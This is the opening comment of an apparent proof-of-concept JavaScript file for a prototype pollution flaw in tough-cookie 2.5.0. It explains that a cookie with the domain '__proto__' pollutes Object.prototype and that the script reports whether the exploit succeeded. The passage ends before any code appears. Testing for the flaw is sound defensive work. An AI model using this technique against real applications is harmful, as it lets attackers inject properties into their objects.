/**
 * This script demonstrates a prototype pollution vulnerability in tough-cookie 2.5.0.
 * Prototype pollution occurs when a JavaScript objectâ€™s prototype is modified.
 * 
 * In this case, by setting a cookie with the domain "__proto__", we are attempting to
 * modify Object.prototype. If successful, this allows attackers to inject properties
 * into all JavaScript objects, which can lead to serious security issues.
 * 
 * If the vulnerability exists, the prototype of `Object.prototype` will be polluted,
 * and the script will print "EXPLOIT SUCCESSFUL".
 * 
 * If the patched version of tough-cookie is installed, the vulnerability will be mitigated,
 * and the script will print "EXPLOIT FAILED".
